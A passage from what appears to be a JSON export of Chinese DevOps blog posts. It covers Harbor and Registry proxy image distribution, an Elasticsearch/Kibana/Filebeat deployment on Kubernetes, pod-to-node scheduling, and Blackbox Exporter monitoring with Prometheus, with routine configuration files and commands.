等服务进行加速分发才会起作用。\n3.3 Insecure Registry 问题 由于没有 docker.io 的 HTTPS 证书，在内网，我们并不能简单的通过修改 docker.io 的 DNS 记录实现无缝切换。这里提供两个思路，在此不详细展开:\n添加 docker.io 到 Insecure Registry 列表 添加根证书到主机，然后利用根证书自签 docker.io 域名的 HTTPS 证书。 3.4 要不要劫持 docker.io 加速镜像拉取 得看是否具备实施条件。\n如果具备对基础设施，包括根证书、容器配置具有很强控制力，还是可以考虑的。原因在于，镜像服务也是基础服务，劫持 docker.io 也能增强对基础设施的管控水平，有助于提供镜像周边的增值服务。\n否则，为了镜像加速破坏了开发、运维人员对 docker.io 的认知，会得不偿失。\n这也引出了下面对其他方案的探索。\n4. 使用 Registry 进行镜像分发 4.1 Registry 不为人知的功能 一般程序员可能只是知道 Registry 可以作为镜像仓库，实际上 Registry 有三种用法：\n镜像仓库 Mirror 加速 docker.io 上的镜像 Proxy 转发拉取镜像请求，与 Mirror 类似，但使用方式完全不同。 下面简单介绍一下 Proxy 功能：\n搭建的方式和 Mirror 一样，参考: 如何搭建一个私有的镜像仓库 mirror\n但在使用时，并不是配置 \u0026quot;registry-mirrors\u0026quot;: [\u0026quot;http://registry_ip:5000\u0026quot;]，而是 \u0026quot;insecure-registries\u0026quot;: [\u0026quot;http://registry_ip:5000\u0026quot;]。\n此时，我们可以通过 docker pull registry_ip:5000/shaowenchen/docker-robotframework:latest 拉取 docker.io/shaowenchen/docker-robotframework:latest 镜像。\n经过我的测试，这里有几个关键点给出：\n如果 docker.io 上的镜像更新了，拉取 Registry 时也会得到最新的镜像 连不上 docker.io，不影响 Registry 提供已经缓存的镜像拉取功能 支持拉取 docker.io 上的私有镜像 支持拉取 registry_ip:5000 认证鉴权 本地会缓存镜像，重复拉取会加速 4.2 镜像加速架构 业务的服务分布在国内、新加坡、日本、印度等很多区域，但是研发在国内，我们的镜像管理平面在国内 Harbor 上，对其他区域主要是对镜像进行分发。\n如上图，核心组件包括两部分：\nHarbor，部署在国内。开发人员利用 CICD 平台将镜像推送到 Harbor 统一管理 Registry，每个业务服务所在的区域都需要部署。当 Kubernetes 运行第一个 Pod 副本时，Registry 会通过公网拉取国内 Harbor 的镜像，缓存到当前区域的 Registry。当运行第二个副本时，将直接从 Registry 通过区域 VPC 内网直接拉取镜像，以达到加速的目的。 4.3 关于 DNS 的配置 如果能直接修改每个区域的 DNS 记录当然最好，否则需要通过添加 /etc/hosts 记录的方式实现。\n研发环境下，镜像仓库指向的是 Harbor 部署环境下，镜像仓库指向的是 Registry 4.4 关于凭证 由于 Registry 并不能代理鉴权，这里会有两套凭证体系。\n研发环境下，使用 Harbor 凭证，可以根据角色自定义 部署环境下，使用 Registry 凭证，全局拉取，不能推送 4.5 快速新增 Registry Proxy 这里简单贴一些配置，以便大家测试。\n生成凭证 1 2 3 4 mkdir auth docker run \\ --entrypoint htpasswd \\ httpd:2 -Bbn global-read xxxxxx \u0026gt; auth/htpasswd 创建配置文件 这里以本地磁盘存储作为实例，但采用对象存储的后端能提供更快的网络访问，特别是跨区域场景下。\n1 vim config.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 version: 0.1 log: fields: service: registry storage: cache: blobdescriptor: inmemory filesystem: rootdirectory: /var/lib/registry http: addr: :5000 headers: X-Content-Type-Options: [nosniff] health: storagedriver: enabled: true interval: 10s threshold: 3 proxy: remoteurl: https://private.chenshaowen.com username: [username] password: [password] 运行代理 1 2 3 4 5 6 7 8 9 10 mkdir /proxy docker run -d -p 8001:5000 --restart=always --name proxy \\ --add-host=private.chenshaowen.com:1.2.3.4 \\ -v `pwd`/auth:/auth \\ -e \u0026#34;REGISTRY_AUTH=htpasswd\u0026#34; \\ -e \u0026#34;REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm\u0026#34; \\ -e REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd \\ -v `pwd`/config.yml:/etc/docker/registry/config.yml \\ -v /proxy:/var/lib/registry \\ registry:2 5. 总结 本文主要思考的是在弱互联环境下，多区域业务如何管理和分发镜像。\n否定了多 Harbor 同步方案，否定了 Dragonfly 分发方案，最终借助于不为人知的 Registry 代理模式，配合 DNS 解析，解决了镜像分发问题。\n如果分发不是问题，那么单一的 Harbor 管理平面足够。\n虽然 Registry 实现的代理满足目前的功能，但其不能转发鉴权、不支持多后端多点传输、不能级联组网，依然具有很大优化空间。\n另一个好处是能水平扩展，可以在新的区域迅速提供镜像服务，支持业务快速开区。\n","description":"","id":151,"section":"post","tags":["博文","Harbor","Registry","镜像","分发"],"title":"基于 Harbor 和 Registry 的镜像管理分发方案","uri":"https://www.chenshaowen.com/blog/a-image-management-and-distribution-case-based-on-harbor-and-registry.html"},{"content":" 如果采用 Logstash 集中接收 Filebeat 的日志输入，容易造成单点瓶颈；如果采用 Kafka 接收 Filebeat 的日志输入，日志的时效性又得不到保障。这里直接将 Filebeat 采集的日志直接输出到 Elasticsearch。\n1. 准备工作 节点规划 这里没有区分 master、data、client 节点，而是直接一个集群三个节点复用。如果是超大规模的 Elasticsearch 集群，建议区分控制面和数据面以提高稳定性。\n确保集群有可用的默认存储 1 2 3 4 kubectl get sc NAME PROVISIONER RECLAIMPOLICY VOLUMEBINDINGMODE ALLOWVOLUMEEXPANSION AGE local (default) openebs.io/local Delete WaitForFirstConsumer false 411d 生成秘钥 1 2 3 4 5 6 7 8 export ELASTICSEARCH_IMAGE=hubimage/elasticsearch:7.17.5 docker run --name elastic-helm-charts-certs -i -w /tmp $ELASTICSEARCH_IMAGE /bin/sh -c \u0026#34; \\ elasticsearch-certutil ca --out /tmp/elastic-stack-ca.p12 --pass \u0026#39;\u0026#39; \u0026amp;\u0026amp; \\ elasticsearch-certutil cert --name security-master --dns security-master --ca /tmp/elastic-stack-ca.p12 --pass \u0026#39;\u0026#39; --ca-pass \u0026#39;\u0026#39; --out /tmp/elastic-certificates.p12\u0026#34; docker cp elastic-helm-charts-certs:/tmp/elastic-certificates.p12 ./ docker rm -f elastic-helm-charts-certs openssl pkcs12 -nodes -passin pass:\u0026#39;\u0026#39; -in elastic-certificates.p12 -out elastic-certificate.pem openssl x509 -outform der -in elastic-certificate.pem -out elastic-certificate.crt 创建 Kubernetes Secret 凭证 1 2 3 4 kubectl create ns elastic kubectl -n elastic create secret generic elastic-certificates --from-file=elastic-certificates.p12 kubectl -n elastic create secret generic elastic-certificate-pem --from-file=elastic-certificate.pem kubectl -n elastic create secret generic elastic-certificate-crt --from-file=elastic-certificate.crt 创建登录用户及密码 1 2 3 4 5 6 7 ELASTIC_USER=elastic ELASTIC_PASSWORD=XXXXXX kubectl create secret generic elastic-credentials -n elastic \\ --from-literal=username=\u0026#34;${ELASTIC_USER}\u0026#34; \\ --from-literal=password=\u0026#34;${ELASTIC_PASSWORD}\u0026#34; \\ --dry-run=client -o yaml | kubectl apply -f - 添加 Elastic Helm Charts 仓库 1 helm repo add elastic https://helm.elastic.co 2. 安装 Elasticsearch 创建一个 values.yaml 文件，配置安装参数 1 vim es-master-values.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 clusterName: \u0026#34;elasticsearch\u0026#34; nodeGroup: \u0026#34;master\u0026#34; roles: master: \u0026#34;true\u0026#34; ingest: \u0026#34;true\u0026#34; data: \u0026#34;true\u0026#34; imageTag: 7.17.5 image: hubimage/elasticsearch volumeClaimTemplate: accessModes: [\u0026#34;ReadWriteOnce\u0026#34;] resources: requests: storage: 200Gi replicas: 3 esConfig: elasticsearch.yml: | xpack.security.enabled: true xpack.security.transport.ssl.enabled: true xpack.security.transport.ssl.verification_mode: certificate xpack.security.transport.ssl.keystore.path: /usr/share/elasticsearch/config/certs/elastic-certificates.p12 xpack.security.transport.ssl.truststore.path: /usr/share/elasticsearch/config/certs/elastic-certificates.p12 extraEnvs: - name: ELASTIC_PASSWORD valueFrom: secretKeyRef: name: elastic-credentials key: password secretMounts: - name: elastic-certificates secretName: elastic-certificates path: /usr/share/elasticsearch/config/certs antiAffinity: \u0026#34;soft\u0026#34; 开始安装组件 1 helm install elasticsearch-master elastic/elasticsearch -n elastic --values es-master-values.yaml --set service.type=NodePort --version 7.17.3 3. 安装 Kibana 创建一个 values.yaml 文件，配置安装参数 1 vim kibana-values.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 elasticsearchHosts: \u0026#34;http://elasticsearch-master.elastic.svc:9200\u0026#34; imageTag: 7.17.5 image: hubimage/kibana replicas: 1 extraEnvs: - name: \u0026#34;NODE_OPTIONS\u0026#34; value: \u0026#34;--max-old-space-size=1800\u0026#34; - name: \u0026#34;ELASTICSEARCH_USERNAME\u0026#34; valueFrom: secretKeyRef: name: elastic-credentials key: username - name: \u0026#34;ELASTICSEARCH_PASSWORD\u0026#34; valueFrom: secretKeyRef: name: elastic-credentials key: password 开始安装组件 1 helm install kibana elastic/kibana -n elastic --values kibana-values.yaml --set service.type=NodePort --version 7.17.3 4. 安装 Filebeat 创建一个 values.yaml 文件，配置安装参数 1 vim filebeat-values.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 image: hubimage/filebeat daemonset: extraEnvs: - name: \u0026#34;ELASTICSEARCH_USERNAME\u0026#34; valueFrom: secretKeyRef: name: elastic-credentials key: username - name: \u0026#34;ELASTICSEARCH_PASSWORD\u0026#34; valueFrom: secretKeyRef: name: elastic-credentials key: password filebeatConfig: filebeat.yml: | filebeat.inputs: - type: filestream id: varlog paths: - /var/log/*.log - type: container enabled: true paths: - /var/lib/docker/containers/*/*.log output.elasticsearch: host: \u0026#34;${NODE_NAME}\u0026#34; hosts: \u0026#39;[\u0026#34;http://${ELASTICSEARCH_HOSTS:elasticsearch-master:9200}\u0026#34;]\u0026#39; username: \u0026#34;${ELASTICSEARCH_USERNAME}\u0026#34; password: \u0026#34;${ELASTICSEARCH_PASSWORD}\u0026#34; protocol: http filebeat.yml 中的 filebeat.inputs 决定了 filebeat 会采集哪些日志。\n开始安装组件 1 helm install filebeat elastic/filebeat -n elastic --values filebeat-values.yaml --version 7.17.3 5. 查看服务验证功能 确保所有服务正常启动 1 2 3 4 5 6 7 8 9 10 kubectl -n elastic get pod NAME READY STATUS RESTARTS AGE elasticsearch-master-0 1/1 Running 0 10h elasticsearch-master-1 1/1 Running 0 10h elasticsearch-master-2 1/1 Running 0 10h filebeat-filebeat-4l9jh 1/1 Running 0 9h filebeat-filebeat-4m7r6 1/1 Running 0 9h filebeat-filebeat-6x9pd 1/1 Running 0 9h kibana-kibana-7976c5dc76-xfswq 1/1 Running 0 10h 查看访问的端口 1 2 3 4 5 6 kubectl -n elastic get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE elasticsearch-master NodePort 10.233.35.209 \u0026lt;none\u0026gt; 9200:30093/TCP,9300:31743/TCP 10h elasticsearch-master-headless ClusterIP None \u0026lt;none\u0026gt; 9200/TCP,9300/TCP 10h kibana-kibana NodePort 10.233.53.16 \u0026lt;none\u0026gt; 5601:30454/TCP 11h 访问 Elasticsearch 通过 HOST_IP:30093 可以访问 Elasticsearch，如下图，此时需要输入账号密码，elastic：XXXXXX，也就是在准备工作中设置的账户信息。\n正确输入凭证之后，Elasticsearch 会返回集群相关信息。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 { \u0026#34;name\u0026#34;: \u0026#34;elasticsearch-master-1\u0026#34;, \u0026#34;cluster_name\u0026#34;: \u0026#34;elasticsearch\u0026#34;, \u0026#34;cluster_uuid\u0026#34;: \u0026#34;D6ugYWeTQSqi3kUAK-B36w\u0026#34;, \u0026#34;version\u0026#34;: { \u0026#34;number\u0026#34;: \u0026#34;7.17.5\u0026#34;, \u0026#34;build_flavor\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;build_type\u0026#34;: \u0026#34;docker\u0026#34;, \u0026#34;build_hash\u0026#34;: \u0026#34;8d61b4f7ddf931f219e3745f295ed2bbc50c8e84\u0026#34;, \u0026#34;build_date\u0026#34;: \u0026#34;2022-06-23T21:57:28.736740635Z\u0026#34;, \u0026#34;build_snapshot\u0026#34;: false, \u0026#34;lucene_version\u0026#34;: \u0026#34;8.11.1\u0026#34;, \u0026#34;minimum_wire_compatibility_version\u0026#34;: \u0026#34;6.8.0\u0026#34;, \u0026#34;minimum_index_compatibility_version\u0026#34;: \u0026#34;6.0.0-beta1\u0026#34; }, \u0026#34;tagline\u0026#34;: \u0026#34;You Know, for Search\u0026#34; } 访问 Kibana 通过 HOST_IP:30454 可以访问 Kibana，如下图，与 Elasticsearch 的账户一样。\n6. 清理环境 卸载 Elasticsearch 1 helm uninstall elasticsearch-master -n elastic 卸载 Kibana 1 helm uninstall kibana -n elastic 卸载 Filebeat 1 helm uninstall filebeat -n elastic 清理存储 1 kubectl -n elastic delete pvc --all 清理环境变量 1 2 unset ELASTIC_USER unset ELASTIC_PASSWORD 7. 参考 https://github.com/elastic/helm-charts/tree/main/elasticsearch https://www.elastic.co/guide/en/beats/filebeat/current/filebeat-input-container.html ","description":"","id":152,"section":"post","tags":["博文","Kubernetes","Elasticsearch","日志"],"title":"在 Kubernetes 集群上部署 Elasticsearch 栈","uri":"https://www.chenshaowen.com/blog/how-to-deploy-the-elasticsearch-stack-on-kubernetes.html"},{"content":"1. 创建负载时，通过 nodeSelector 指定 Node 给节点添加标签 1 kubectl label node node2 project=A 指定 nodeSelector 创建工作负载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: apps/v1 kind: Deployment metadata: name: nginx-nodeselector spec: replicas: 1 selector: matchLabels: app: nginx-nodeselector template: metadata: labels: app: nginx-nodeselector spec: nodeSelector: project: A containers: - name: nginx image: nginx EOF 查看工作负载 1 2 3 4 kubectl get pod -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES nginx-nodeselector-7bb75b7687-7r5xk 1/1 Running 0 19s 10.233.96.60 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 符合预期，Pod 运行在指定的节点 node2 上。\n清理环境 1 2 kubectl delete deployments nginx-nodeselector kubectl label node node2 project- 实际上，还有另外一个节点选择参数 nodeName，直接指定节点名。但是这种设置过于生硬，而且越过了 Kubernetes 本身的调度机制，实际生产用得很少。\n2. 通过准入控制将命名空间绑定到节点 创建负载时指定 nodeSelector，可以设置 Pod 运行的节点。但是如果想要绑定命名空间下全部 Pod 在指定节点下运行，就显得力不从心。而使用 kube-apiserver 的准入控制就可以达到这一目的，这是一个在 Kubernetes 1.5 时就进入 alpha 阶段的特性。\n2.1 修改 kube-apiserver 参数 编辑 kube-apiserver 文件:\n1 vim /etc/kubernetes/manifests/kube-apiserver.yaml 在 admission-plugins 中新增 PodNodeSelector:\n1 - --enable-admission-plugins=NodeRestriction,PodNodeSelector 这里的 NodeRestriction 是默认开启的。如果是高可用的集群，那么需要修改每一个 kube-apiserver。修改完成之后，稍等一会儿 kube-apiserver 会完成重启过程。\n2.2 给 Namespace 添加注解 编辑命名空间，增加注解:\n1 kubectl edit ns default 1 2 3 4 5 6 apiVersion: v1 kind: Namespace metadata: name: default annotations: scheduler.alpha.kubernetes.io/node-selector: project=A scheduler.alpha.kubernetes.io/node-selector 可以是节点名，也可以是 label 键值对。\n2.3 为节点增加指定的 label 给 node3 节点打上 project=A 的标签:\n1 kubectl label node node3 project=A 这里将命名空间 default 上的负载，绑定到了节点 node3 上。\n2.4 创建负载 创建负载进行测试 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: apps/v1 kind: Deployment metadata: name: nginx-scheduler spec: replicas: 3 selector: matchLabels: app: nginx-scheduler template: metadata: labels: app: nginx-scheduler spec: containers: - name: nginx image: nginx EOF 查看负载分布 1 2 3 4 5 6 kubectl get pod -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES nginx-scheduler-6478998698-brkzn 1/1 Running 0 84s 10.233.92.52 node3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-scheduler-6478998698-m422x 1/1 Running 0 84s 10.233.92.51 node3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-scheduler-6478998698-mnf4d 1/1 Running 0 84s 10.233.92.50 node3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 可以看到，虽然集群上有 4 个可用的节点，但是 default 空间下的负载都运行在 node3 节点之下。\n2.5 清理环境 清理 label 1 kubectl label node node3 project- 清理负载 1 kubectl delete deployments nginx-scheduler 清理注解 kubectl edit ns default 需要注意的是，如果命名空间已经开启了 scheduler.alpha.kubernetes.io/node-selector，而节点没有相关的标签，此时，Pod 将会一直处于 Pending 状态，无法得到调度，直至有符合标签的 Node 出现。\n3. 利用拓扑域对节点进行分组 如下图，通过 kube-apiserver 的访问控制插件，我们可以建立模型，每个项目一个命名空间，每个命名空间包含指定的节点。这样就可以满足，业务隔离、成本计费的要求。但是随着集群越来越大，项目需要在集群下划分若干的可用区，用于保障业务的可用性。\n而拓扑域主要就是解决 Pod 在集群的分布问题，可以用于实现 Pod 对节点的定向选择的需求。Kubernetes 集群调度器的拓扑域特性在 1.16 进入 Alpha 阶段，在 1.18 进入 Beta 阶段。下面我们进行一些实验:\n将节点划分到不同的拓扑域 这里将节点 node2 划分到 zone a，将 node3、node4 划分到 zone b。\n1 kubectl label node node2 zone=a 1 kubectl label node node3 node4 zone=b 创建负载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: apps/v1 kind: Deployment metadata: name: nginx-topology spec: replicas: 20 selector: matchLabels: app: nginx-topology template: metadata: labels: app: nginx-topology spec: topologySpreadConstraints: - maxSkew: 1 topologyKey: zone whenUnsatisfiable: DoNotSchedule labelSelector: matchLabels: app: nginx-topology containers: - name: nginx image: nginx EOF 这里 topologyKey 用于指定划分拓扑域的 Key，maxSkew 表示在 zone=a、zone=b 中 Pod 数量相差不能超过 1， whenUnsatisfiable: DoNotSchedule 表示不满足条件时，不进行调度。\n查看 Pod 分布 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 kubectl get pod -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES nginx-topology-7d8698544d-2srcj 1/1 Running 0 3m3s 10.233.92.63 node3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-2wxkp 1/1 Running 0 3m3s 10.233.96.53 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-4db5b 1/1 Running 0 3m3s 10.233.105.43 node4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-9tqvn 1/1 Running 0 3m3s 10.233.96.58 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-9zll5 1/1 Running 0 3m3s 10.233.105.45 node4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-d6nbm 1/1 Running 0 3m3s 10.233.105.44 node4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-f4nw9 1/1 Running 0 3m3s 10.233.96.54 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-ggfgv 1/1 Running 0 3m3s 10.233.92.66 node3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-gj4pg 1/1 Running 0 3m3s 10.233.92.61 node3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-jc2xt 1/1 Running 0 3m3s 10.233.92.62 node3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-jmmcx 1/1 Running 0 3m3s 10.233.96.56 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-l45qj 1/1 Running 0 3m3s 10.233.92.65 node3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-lwp8m 1/1 Running 0 3m3s 10.233.92.64 node3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-m65rx 1/1 Running 0 3m3s 10.233.96.57 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-pzrzs 1/1 Running 0 3m3s 10.233.96.55 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-tslxx 1/1 Running 0 3m3s 10.233.92.60 node3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-v4cqx 1/1 Running 0 3m3s 10.233.96.50 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-w4r86 1/1 Running 0 3m3s 10.233.96.52 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-wwn95 1/1 Running 0 3m3s 10.233.96.51 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-topology-7d8698544d-xffpx 1/1 Running 0 3m3s 10.233.96.59 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 其中在 node2 节点 10 个 Pod、node3 节点 7 个节点、node4 节点 3 个节点。可以看到，Pod 均匀地分布在 zone=a、zone=b 上。\n清理环境 1 2 kubectl label node node2 node3 node4 zone- kubectl delete deployments nginx-topology 4. 总结 随着集群越来越大，业务之间的隔离、业务对节点的独占等问题就会浮现出来。通常，每个业务都会有一个单独的命名空间，因此，我们可以将命名空间与节点进行绑定。\n本文主要给出了两种方法，一种是创建负载时，直接设置 nodeSelector，取巧的方法是用命名空间值作为 value；另外一种方式是，借助于 kube-apiserver 提供的访问控制插件，通过注解的方式，在创建命名空间下的负载时，通过标签筛选指定节点，完成命名空间与节点之间的绑定。\n再进一步考虑，如果节点数量非常庞大，需要划分可用区分散负载，那么我们可以借助于拓扑域来实现。通过拓扑域，我们可以让负载，根据配置的策略均匀的分布在指定的可用区、机柜上。\n5. 参考 https://kubernetes.io/zh-cn/docs/reference/scheduling/config/ https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/admission-controllers/ ","description":"","id":153,"section":"post","tags":["博文","Pod","Kubernetes","调度"],"title":"如何设置 Pod 到指定节点运行","uri":"https://www.chenshaowen.com/blog/how-to-set-up-pod-to-run-to-a-specified-node.html"},{"content":" 如果你需要监控两个主机、主机与外部服务之间的网络状况，那么就可以试一试本文提到的 Blackbox Exporter。\n1. 安装 Blackbox 1.1 在主机上部署 下载二进制包 1 2 3 4 5 wget https://github.com/prometheus/blackbox_exporter/releases/download/v0.21.0/blackbox_exporter-0.21.0.linux-amd64.tar.gz tar -xzvf blackbox_exporter-0.21.0.linux-amd64.tar.gz mv blackbox_exporter-0.21.0.linux-amd64/blackbox_exporter /usr/bin/ mkdir /etc/prometheus mv blackbox_exporter-0.21.0.linux-amd64/blackbox.yml /etc/prometheus/ 清理安装包 1 rm -rf blackbox_exporter-0.21.0.linux-amd64* 新建 Systemd 服务 1 vim /usr/lib/systemd/system/blackbox_exporter.service 新增如下内容:\n[Unit] Description=blackbox_exporter After=network.target [Service] Restart=on-failure ExecStart=/usr/bin/blackbox_exporter \\ --config.file=/etc/prometheus/blackbox.yml Restart=on-failure [Install] WantedBy=multi-user.target 启动服务 1 2 systemctl enable blackbox_exporter systemctl start blackbox_exporter 查看运行状态 1 systemctl status blackbox_exporter 1.2 在集群上部署 在 Kubernetes 上安装就简单多了，直接 apply 下面的 Yaml 就可以。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 apiVersion: v1 kind: ConfigMap metadata: name: blackbox-config namespace: kube-system data: blackbox.yml: |- modules: http_2xx: prober: http http: preferred_ip_protocol: \u0026#34;ipv4\u0026#34; http_post_2xx: prober: http http: method: POST tcp_connect: prober: tcp pop3s_banner: prober: tcp tcp: query_response: - expect: \u0026#34;^+OK\u0026#34; tls: true tls_config: insecure_skip_verify: false grpc: prober: grpc grpc: tls: true preferred_ip_protocol: \u0026#34;ip4\u0026#34; grpc_plain: prober: grpc grpc: tls: false service: \u0026#34;service1\u0026#34; ssh_banner: prober: tcp tcp: query_response: - expect: \u0026#34;^SSH-2.0-\u0026#34; - send: \u0026#34;SSH-2.0-blackbox-ssh-check\u0026#34; irc_banner: prober: tcp tcp: query_response: - send: \u0026#34;NICK prober\u0026#34; - send: \u0026#34;USER prober prober prober :prober\u0026#34; - expect: \u0026#34;PING :([^ ]+)\u0026#34; send: \u0026#34;PONG ${1}\u0026#34; - expect: \u0026#34;^:[^ ]+ 001\u0026#34; icmp: prober: icmp --- apiVersion: apps/v1 kind: Deployment metadata: name: blackbox namespace: kube-system spec: selector: matchLabels: app: blackbox template: metadata: labels: app: blackbox spec: hostAliases: - ip: \u0026#34;0.0.0.0\u0026#34; hostnames: - \u0026#34;dev.chenshaowen.com\u0026#34; containers: - image: prom/blackbox-exporter:v0.21.1 name: blackbox args: - --config.file=/etc/blackbox_exporter/blackbox.yml - --log.level=error ports: - containerPort: 9115 volumeMounts: - name: config mountPath: /etc/blackbox_exporter volumes: - name: config configMap: name: blackbox-config --- apiVersion: v1 kind: Service metadata: name: blackbox namespace: kube-system spec: selector: app: blackbox ports: - port: 9115 targetPort: 9115 type: NodePort 2. 测试主机对外访问连通性 blackbox_exporter 默认在本地 9115 端口暴露服务。\n实际上，通过拼接 URL 的方式，我们就可以实现主机对任意服务的连通测试，下面是一个实例，只需要提供 target、module 参数即可，其中 target 表示测试的目标，module 表示测试用的模块:\n浏览器访问 http://BLACKBOX_HOST_IP:9115/probe?target=google.com\u0026amp;module=http_2xx，需要将 BLACKBOX_HOST_IP 替换为主机 IP。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 # HELP probe_dns_lookup_time_seconds Returns the time taken for probe dns lookup in seconds # TYPE probe_dns_lookup_time_seconds gauge probe_dns_lookup_time_seconds 0.030818323 # HELP probe_duration_seconds Returns how long the probe took to complete in seconds # TYPE probe_duration_seconds gauge probe_duration_seconds 0.353982702 # HELP probe_failed_due_to_regex Indicates if probe failed due to regex # TYPE probe_failed_due_to_regex gauge probe_failed_due_to_regex 0 # HELP probe_http_content_length Length of http content response # TYPE probe_http_content_length gauge probe_http_content_length -1 # HELP probe_http_duration_seconds Duration of http request by phase, summed over all redirects # TYPE probe_http_duration_seconds gauge probe_http_duration_seconds{phase=\u0026#34;connect\u0026#34;} 0.08580119300000001 probe_http_duration_seconds{phase=\u0026#34;processing\u0026#34;} 0.201979714 probe_http_duration_seconds{phase=\u0026#34;resolve\u0026#34;} 0.060847821999999996 probe_http_duration_seconds{phase=\u0026#34;tls\u0026#34;} 0 probe_http_duration_seconds{phase=\u0026#34;transfer\u0026#34;} 0.003931112 # HELP probe_http_redirects The number of redirects # TYPE probe_http_redirects gauge probe_http_redirects 3 # HELP probe_http_ssl Indicates if SSL was used for the final redirect # TYPE probe_http_ssl gauge probe_http_ssl 0 # HELP probe_http_status_code Response HTTP status code # TYPE probe_http_status_code gauge probe_http_status_code 200 # HELP probe_http_uncompressed_body_length Length of uncompressed response body # TYPE probe_http_uncompressed_body_length gauge probe_http_uncompressed_body_length 13645 # HELP probe_http_version Returns the version of HTTP of the probe response # TYPE probe_http_version gauge probe_http_version 1.1 # HELP probe_ip_addr_hash Specifies the hash of IP address. It\u0026#39;s useful to detect if the IP address changes. # TYPE probe_ip_addr_hash gauge probe_ip_addr_hash 4.032438981e+09 # HELP probe_ip_protocol Specifies whether probe ip protocol is IP4 or IP6 # TYPE probe_ip_protocol gauge probe_ip_protocol 4 # HELP probe_success Displays whether or not the probe was a success # TYPE probe_success gauge probe_success 1 在注释中，对这些指标有着很详尽的描述，DNS 延时、响应、协议等。\n3. Prometheus 配置 接着，我们可以让 Prometheus 定时抓取 blackbox 的指标。下面是相关的配置文件，需要将 BLACKBOX_HOST_IP 替换为 blackbox_exporter 部署主机的 IP 地址。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 scrape_configs: - job_name: \u0026#39;blackbox_http\u0026#39; metrics_path: /probe params: module: [http_2xx] static_configs: - targets: [\u0026#39;github.com\u0026#39;] labels: url: \u0026#39;github.com\u0026#39; - targets: [\u0026#39;dl-cdn.alpinelinux.org\u0026#39;] labels: url: \u0026#39;dl-cdn.alpinelinux.org\u0026#39; relabel_configs: - source_labels: [__address__] target_label: __param_target - target_label: __address__ replacement: BLACKBOX_HOST_IP:9115 - job_name: \u0026#39;blackbox_icmp\u0026#39; metrics_path: /probe params: module: [icmp] static_configs: - targets: [\u0026#39;github.com\u0026#39;] labels: url: \u0026#39;github.com\u0026#39; - targets: [\u0026#39;dl-cdn.alpinelinux.org\u0026#39;] labels: url: \u0026#39;dl-cdn.alpinelinux.org\u0026#39; relabel_configs: - source_labels: [__address__] target_label: __param_target - 